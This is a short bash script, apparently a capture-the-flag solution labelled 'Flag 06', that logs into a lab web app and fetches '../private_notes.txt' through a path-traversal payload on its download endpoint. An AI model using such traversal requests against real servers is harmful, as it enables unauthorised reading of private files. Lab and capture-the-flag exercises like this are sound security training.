#!/usr/bin/env bash
# Flag 06 — Path traversal / arbitrary file read (single ../ only)
set -uo pipefail
TARGET="${TARGET:-localhost}"
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$DIR/lib.sh"
JAR="$DIR/.jdoe-06.jar"

darkly_login "$TARGET" "$JAR" || exit 1

echo "[*] Requesting ../private_notes.txt" >&2
curl -s -b "$JAR" "http://${TARGET}:4942/projects/download?file=../private_notes.txt"
echo
